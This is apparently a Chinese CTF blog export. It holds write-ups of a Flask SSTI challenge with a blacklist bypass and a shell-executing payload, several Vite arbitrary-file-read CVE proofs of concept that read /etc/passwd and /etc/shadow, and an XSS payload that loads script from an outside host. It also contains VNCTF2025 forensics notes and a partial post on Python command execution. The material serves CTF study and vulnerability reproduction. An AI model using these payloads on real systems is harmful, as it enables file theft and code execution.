black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;_.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]
<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):
    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:
        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():
            <span class="keyword">return</span> <span class="literal">True</span>
    <span class="keyword">return</span> <span class="literal">False</span>
<span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):
    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span>
    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">home</span>():
    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">greet</span>():
    template1=<span class="string">&quot;&quot;</span>
    template2=<span class="string">&quot;&quot;</span>
    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)
    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>
    <span class="keyword">if</span> waf(name):
        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span>
<span class="string">Image&#x27;</span>
    <span class="keyword">else</span>:
        k=<span class="number">0</span>
        <span class="keyword">for</span> i <span class="keyword">in</span> name:
            <span class="keyword">if</span> is_typable(i):
                <span class="keyword">continue</span>
            k=<span class="number">1</span>
            <span class="keyword">break</span>
        <span class="keyword">if</span> k==<span class="number">1</span>:
            <span class="keyword">if</span> <span class="keyword">not</span> (secret_key[:<span class="number">2</span>] <span class="keyword">in</span> name <span class="keyword">and</span> secret_key[<span class="number">2</span>:]):
                template = <span class="string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧</span>
<span class="string"></span>
<span class="string">再去西行历练历练</span>
<span class="string"></span>
<span class="string">Image&#x27;</span>
                <span class="keyword">return</span> render_template_string(template)
            template1 = <span class="string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”</span>
<span class="string">最后，如果你用了cat，就可以见到齐天大圣了</span>
<span class="string">&quot;</span>
            template= template.replace(<span class="string">&quot;天命&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>).replace(<span class="string">&quot;难违&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>)
            template = template
    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> template:
        template2 = <span class="string">&#x27;</span>
<span class="string">或许你这只叫天命人的猴子，真的能做到？</span>
<span class="string"></span>
<span class="string">Image&#x27;</span>
    <span class="keyword">try</span>:
        <span class="keyword">return</span> template1+render_template_string(template)+render_template_string(template2)
    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
        error_message = <span class="string">f&quot;500报错了，查询语句如下：</span>
<span class="string"><span class="subst">&#123;template&#125;</span>&quot;</span>
        <span class="keyword">return</span> error_message, <span class="number">400</span>

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">hinter</span>():
    template=<span class="string">&quot;hint：</span>
<span class="string">有一个aazz路由，去那里看看吧，天命人!&quot;</span>
    <span class="keyword">return</span> render_template_string(template)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aazz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">finder</span>():
    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        source_code = f.read()
    <span class="keyword">return</span> <span class="string">f&quot;</span>
<span class="string"><span class="subst">&#123;source_code&#125;</span></span>
<span class="string">&quot;</span>, <span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;

<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215533251.png" alt="image-20250413215533251"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215326433.png" alt="image-20250413215326433"></p>
<p>最终paylaod</p>
<pre><code class="highlight plaintext">name=天命()[&#x27;\x5f\x5fclass\x5f\x5f&#x27;][&#x27;\x5f\x5fmro\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;]()[351](&#x27;cat ntgffff11111aaaagggggggg&#x27;,shell=True,stdout=-1).communicate()[0].strip()难违</code></pre>

<p>看队里师傅wp这题是能用fenjing的，有点难绷哈哈</p>
<h3 id="前端游戏-复现"><a href="#前端游戏-复现" class="headerlink" title="前端游戏(复现)"></a>前端游戏(复现)</h3><p><code>CVE-2025-30208</code></p>
<pre><code class="highlight plaintext">/@fs/tgflagggg?import&amp;raw??
/@fs/tgflagggg?raw??</code></pre>



<h3 id="前端游戏Plus-复现"><a href="#前端游戏Plus-复现" class="headerlink" title="前端游戏Plus (复现)"></a>前端游戏Plus (复现)</h3><p><code>CVE-2025-31486</code>的复现</p>
<p>是一个任意文件读的漏洞</p>
<p>先贴出poc</p>
<pre><code class="highlight plaintext">/tgflagggg?.svg?.wasm?init</code></pre>

<p>打完之后还尝试了一下打穿一下root</p>
<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415135336099.png" alt="image-20250415135336099"></p>
<p>看了一眼原CVE下的另一个poc</p>
<pre><code class="highlight plaintext">curl &#x27;http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw&#x27;
#https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</code></pre>

<p>这个是打不穿的,因为前面目录的名字未知，不好打，贴一下官方WP的POC</p>
<pre><code class="highlight plaintext">@fs/app/?/../../../../../tgflagggg?import&amp;?raw</code></pre>

<h3 id="前端游戏Ultra-复现"><a href="#前端游戏Ultra-复现" class="headerlink" title="前端游戏Ultra(复现)"></a>前端游戏Ultra(复现)</h3><p>这三个前端的CVE都挺新的</p>
<p><code>CVE-2025-32395</code></p>
<p>先贴原漏洞的poc</p>
<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173
#https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4</code></pre>

<p>这个就是真要猜测路径了哈哈(</p>
<p>幸好给了源码</p>
<p>复现的时候哈基bar应激了，换了bp打<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415141634705.png" alt="image-20250415141634705"></p>
<p>不知道为什么官方poc给的是四个套，虽然不影响结果，但是先质疑再质疑哈</p>
<p>顺带看到了另一个相关的CVE，也学习一下算了</p>
<p><code>CVE-2025-31125</code></p>
<p>这个洞是利用inline的规则配合.wsam进行绕过(是对第一个CVE的补丁的绕过)</p>
<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init</code></pre>

<p>这边引用一下大佬的解释好了</p>
<pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：
将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求
?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持
通过这种新的方法绕过了修复后的正则过滤
//原链接https://cloud.tencent.com/developer/article/2513407</code></pre>

]]></content>
      <tags>
        <tag>-WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2025</title>
    <url>/2025/02/10/VNCTF2025/</url>
    <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
<p>比赛期间就出了一题，这才是正统misc吗哈哈(</p>
<h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a><strong>VN_Lang</strong></h2><p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
<h2 id="echo-flowers"><a href="#echo-flowers" class="headerlink" title="echo_flowers"></a>echo_flowers</h2><p>区块链的基本知识和取证搭配的好题。大概?</p>
<p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p>
<p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
<p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
<p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p>
<p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p>
<p>也就是，从输入法的缓存，或者说，输入的记录入手。</p>
<p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
<p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
<p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
<p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
<p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p>
<p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p>
<h2 id="ezSignal"><a href="#ezSignal" class="headerlink" title="ezSignal"></a>ezSignal</h2><p>C3师傅的旷世之作(不仅指半夜更新附件)</p>
<p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
<p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p>
<p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
<p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ‘</p>
<p>那么将压缩包复制到Ubuntu</p>
<pre><code class="highlight bash">unzip ezSignal_fix.zip
<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>

<p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
<p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
<p>喂AI&#x2F;看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p>
<p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p>
<p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p>
<pre><code class="highlight plaintext">import numpy as np
from scipy.io import wavfile
from scipy.signal import butter, lfilter

def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
    &quot;&quot;&quot;
    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）
    - dtype: 数据类型（默认 float32）
    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）
    &quot;&quot;&quot;
    # 以二进制模式读取文件
    with open(filename, &quot;rb&quot;) as f:
        raw_bytes = f.read()
    

# 转换为指定字节序和类型的 numpy 数组

dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
data = np.frombuffer(raw_bytes, dtype=dt)
return data

def main():

    # 参数配置（与 GRC 一致）

     samp_rate = 48000      # 音频采样率
     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）
     max_dev = 5e3          # FM最大频偏
     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）

try:

    # 1. 读取I/Q数据（二进制模式）

     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)

    # 检查长度一致性

     if len(i_data) != len(q_data):
         raise ValueError(&quot;I/Q数据长度不一致！&quot;)

    # 2. 合并为复数信号（I + jQ）

     complex_signal = i_data + 1j * q_data

    # 3. FM解调（相位差分法）

     phase = np.unwrap(np.angle(complex_signal))
     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
     demodulated = demodulated.astype(np.float32)

    # 4. 重采样到音频采样率（48 kHz）

     demodulated_resampled = demodulated[::4]  # 简单下采样

    # 5. 低通滤波（300-5000 Hz，与GRC一致）

     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
     demodulated_resampled = lfilter(b, a, demodulated_resampled)

    # 6. 归一化并保存为WAV

     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)

     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)

except FileNotFoundError:
    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)
except Exception as e:
    print(f&quot;错误：&#123;str(e)&#125;&quot;)

if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p>
<p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
<p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
]]></content>
      <tags>
        <tag>-CTF -Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Vite相关CVE</title>
    <url>/2025/04/16/Vite%E7%9B%B8%E5%85%B3CVE/</url>
    <content><![CDATA[<h1 id="Vite相关CVE"><a href="#Vite相关CVE" class="headerlink" title="Vite相关CVE"></a>Vite相关CVE</h1><p>TG遇到了Vite这个东西，出了三个前端的cve题目，都是很新鲜的cve，因此想着了解一下Vite相关的cve，复现可能要等后面学了ts再看了唉唉。。</p>
<h2 id="CVE-2022-35204"><a href="#CVE-2022-35204" class="headerlink" title="CVE-2022-35204"></a>CVE-2022-35204</h2><p>Vite的一个任意文件读取漏洞</p>
<p>vite 默认启用的 <code>/@fs/</code> 路由用于访问任意本地文件</p>
<p>但是正常访问是会被block的</p>
<p>但是可以利用<code>../</code>绕过进行任意文件读</p>
<p>目前还未复现，贴上别的师傅打好的poc</p>
<pre><code class="highlight plaintext">curl --path-as-is http://localhost:3000/@fs/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts
//原链接 https://blog.sww.moe/post/exploits/cve-2022-35204/</code></pre>

<p>这个漏洞的成因大概就是decodeURI这个函数的漏洞</p>
<pre><code class="highlight plaintext">decodeURI在解码时会将大部分的ASCII标点符号和预留字符保留不变，包括/和%2f
这样就会导致/../未被检测到而绕过了安全检测
传入的/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts 的时候，decodeURI 函数解析出来的结果会保留其中的所有 %2f，再经由下一步的 path.resolve 函数解析，最终结果是 /home/swwind/tmp/cve/CVE-2022-35204/..%2f..%2f..%2f..%2f../etc/hosts，由此非常轻松地就绕过了 vite 的允许目录检查。</code></pre>

<p>相比之下，decodeURIcomponent就要好一些，因为其解码 URI 组件中的字符，而不是完整的 URI。它可以正确解码任何 ASCII 字符或 UTF-8 字符集，包括默认 URI 编码中使用的所有预留字符和其他特殊字符</p>
<p>在decodeURIcomponent的处理后，传入的参数被解析为<code>/home/swwind/tmp/cve/CVE-2022-35204/../../../../../etc/hosts</code>，会被正确过滤为<code>/etc/hosts</code>，从而防御了任意文件读取</p>
<h2 id="CVE-2023-49293"><a href="#CVE-2023-49293" class="headerlink" title="CVE-2023-49293"></a>CVE-2023-49293</h2><p>Vite的一个XSS漏洞</p>
<p>复现可能要回头了把<a href="https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97">XSS vulnerability in <code>server.transformIndexHtml</code> via URL payload · Advisory · vitejs&#x2F;vite · GitHub</a></p>
<p>poc就是直接在后面query打一个普通的反射xss语句，直接弹</p>
<pre><code class="highlight plaintext">?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E
//?&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&#x27;boom&#x27;)&lt;/script&gt;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416124525018.png" alt="image-20250416124525018"></p>
<p>再尝试构造弹了一下</p>
<pre><code class="highlight plaintext">?&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://71g9hx8u.requestrepo.com/&quot;;&gt; &lt; /script&gt;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416125624323.png" alt="image-20250416125624323"></p>
<h2 id="CVE-2025-30208"><a href="#CVE-2025-30208" class="headerlink" title="CVE-2025-30208"></a>CVE-2025-30208</h2><p>还是相同的<code>@fs</code>的利用</p>
<p>这边贴poc，回头会补复现</p>
<pre><code class="highlight plaintext">/@fs/etc/passwd?import&amp;raw??
/@fs/etc/passwd?raw??</code></pre>

<p><a href="https://www.xaitx.com/tech/2025-03-26.html">Vite 任意文件读取漏洞分析复现（CVE-2025-30208） | 小艾博客</a></p>
<h2 id="CVE-2025-31125"><a href="#CVE-2025-31125" class="headerlink" title="CVE-2025-31125"></a>CVE-2025-31125</h2><p>这个洞是利用inline的规则配合.wsam进行绕过(是对上一个CVE的补丁的绕过)</p>
<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init
还有两个下面那个大佬打出来的未公开poc//适用6.2.4
/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init
/@fs/etc/shadow?meteorkai.svg?.wasm?init  //这里没有import是因为读取的文件没有后缀，isJSRequest为true</code></pre>

<p>这边引用一下大佬的解释好了</p>
<pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：
将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求
?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持
通过这种新的方法绕过了修复后的正则过滤
//原链接https://cloud.tencent.com/developer/article/2513407</code></pre>

<p><a href="https://xz.aliyun.com/news/17655">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区</a></p>
<h2 id="CVE-2025-31486"><a href="#CVE-2025-31486" class="headerlink" title="CVE-2025-31486"></a>CVE-2025-31486</h2><p>先贴出poc</p>
<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init
/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw</code></pre>

<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">原链</a></p>
<p>其中第二个poc是需要先探出大概的路径才能打的</p>
<p><a href="https://xz.aliyun.com/news/17730">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31486）-先知社区</a></p>
<h2 id="CVE-2025-32395"><a href="#CVE-2025-32395" class="headerlink" title="CVE-2025-32395"></a>CVE-2025-32395</h2><p>poc</p>
<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173</code></pre>

<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4">原链</a></p>
<p><a href="https://xz.aliyun.com/news/17745">Vite任意文件读取bypass调试分析（CVE-2025-32395）-先知社区</a></p>
]]></content>
      <tags>
        <tag>-CVE -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>python的RCE姿势以及内存马注入</title>
    <url>/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="python的rce姿势以及内存马注入-未补完"><a href="#python的rce姿势以及内存马注入-未补完" class="headerlink" title="python的rce姿势以及内存马注入(未补完)"></a>python的rce姿势以及内存马注入(未补完)</h1><p>python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢</p>
<p>诶，注入一个内存马试试.?</p>
<h2 id="Python-的命令执行"><a href="#Python-的命令执行" class="headerlink" title="Python 的命令执行"></a>Python 的命令执行</h2><p>不同于php自带的命令执行函数，python是要先引入模块的，参考jinja2模板注入找os内置函数的那个过程</p>
<h3 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h3><p>经典款:</p>
<h4 id="os-system"><a href="#os-system" class="headerlink" title="os.system:"></a><code>os.system</code>:</h4><p>可以用来执行系统命令,但是无法将系统命令执行的结果返回.如果执行成功了会返回0,失败了会返回1</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
os.system(<span class="string">&#x27;dir&#x27;</span>)  //输出目录结构
<span class="built_in">print</span>(os.system(<span class="string">&#x27;dir&#x27;</span>))  //输出目录结构,下一行输出<span class="number">0</span></code></pre>

<h4 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen:"></a><code>os.popen</code>:</h4><p>可以用来将系统命令执行的结构存储到一个管道文件中(什么是管道文件?个人理解是类似php中的phar这种).然后可以通过read方法来将管道文件的内容返回</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
out=os.popen(<span class="string">&#x27;dir&#x27;</span>)
<span class="built_in">print</span>(out.read())</code></pre>

<h3 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h3><p>可以认为subprocess是os模块的安全版</p>
<h4 id="subprocess-run"><a href="#subprocess-run" class="headerlink" title="subprocess.run:"></a><code>subprocess.run</code>:</h4><p>基本是subprocess中最常用的模块,包含下列参数</p>
<pre><code class="highlight python">subprocess.run(args, *, stdin=<span class="literal">None</span>, <span class="built_in">input</span>=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, capture_output=<span class="literal">False</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, check=<span class="literal">False</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, text=<span class="literal">None</span>, env=<span class="literal">None</span>, universal_newlines=<span class="literal">None</span>)</code></pre>

<hr>
<pre><code class="highlight plaintext">1.唯一一个必须要有的参数,为一个字符串列表/字符串,其中第一个值是一个应用程序,后面的则是传递的参数</code></pre>

<pre><code class="highlight python"><span class="keyword">import</span> subprocess
out=subprocess.run([<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;-p&quot;</span>],capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)
<span class="built_in">print</span>(out.stdout)</code></pre>

<p>这也是我们常说的弹计算器命令,但是需要注意,由于windows并不是像linux那样由纯文件组成,所以这里的列表中无法直接使用dir命令如<code>[&quot;dir&quot;]</code>(本质上这个dir是传递给windows.cmd的一个参数,但是这个windows.cmd程序的位置找不到)</p>
<hr>
<pre><code class="highlight plaintext">2.shell=True,默认为false</code></pre>

<p>用于控制是否允许在第一个参数处直接使用shell命令的,开启后则可以不使列表而是以字符串形式直接使用,如:</p>
<pre><code class="highlight python"><span class="keyword">import</span> subprocess
out=subprocess.run(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)
<span class="built_in">print</span>(out.stdout)</code></pre>

<p>复现效果：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184321691.png" alt="image-20250325184321691"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184555941.png" alt="image-20250325184555941"></p>
<hr>
<pre><code class="highlight plaintext">3.stdin,stdout,stderr,默认为false</code></pre>

<p>这三个参数用来设置输入,输出和错误信息为管道对象或是类文件对象,这里不常用.</p>
<hr>
<pre><code class="highlight plaintext">4.capture_output=true,默认为false</code></pre>

<p>用于捕获stdout和stderr时期不会输出到终端而是作为一个对象来返回.</p>
<hr>
<pre><code class="highlight plaintext">5.text=true,默认为false</code></pre>

<p>默认状态下返回的数据为字节流,而<code>text=true</code>可以使得返回的数据为字符串而不是字节流,不用人手动转换.</p>
<hr>
<pre><code class="highlight plaintext">6.encoding=&#x27;utf-8&#x27;</code></pre>

<p>如果指定了参数,则stdin,stdout,stderr可以接受该类型的数据,否则默认为字节流.可以认为是<code>text=true</code>的一个手动选择版</p>
<hr>
<pre><code class="highlight plaintext">7.timeout</code></pre>

<p>设置命令超时时间.如果命令执行时间超时,子进程将被杀死,并弹出 <code>TimeoutExpired</code>异常.</p>
<hr>
<pre><code class="highlight plaintext">8.check=true</code></pre>

<p>如果该参数设置为<code>True</code>,并且进程退出状态码不是0,则弹出<code>CalledProcessError</code>异常.</p>
<h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen"></a><code>subprocess.Popen</code></h4><p>是subprocess方法的核心,可用于实现更为复杂的功能</p>
<p>具体介绍就不给了，给两个大佬的博客自己选择着看看把(</p>
<p><a href="https://www.cnblogs.com/-qing-/p/10934322.html">Python之subprocess模块 - 卿先生 - 博客园</a></p>
<p><a href="https://www.cnblogs.com/yifengyu/p/16115712.html">python中的subprocess.Popen()、PIPE使用详解 - 平行时空的旅者 - 博客园</a></p>
<p>直接开始本地复现</p>
<pre><code class="highlight plaintext">import  subprocess
p = subprocess.Popen(&quot;dir&quot;, shell=True,encoding=&quot;utf-8&quot;)</code></pre>

<p>在linux成功复现</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191600985.png" alt="image-20250325191600985"></p>
<p>反观windows(</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191725159.png" alt="image-20250325191725159"></p>
<p>修了一下，是编码问题+一个stdout和stderr未重定向到PIPE的问题</p>
<p>修了一下成功读取</p>
<pre><code class="highlight python"><span class="keyword">import</span>  subprocess
p = subprocess.Popen(<span class="string">&quot;dir&quot;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding=<span class="string">&quot;gbk&quot;</span>)

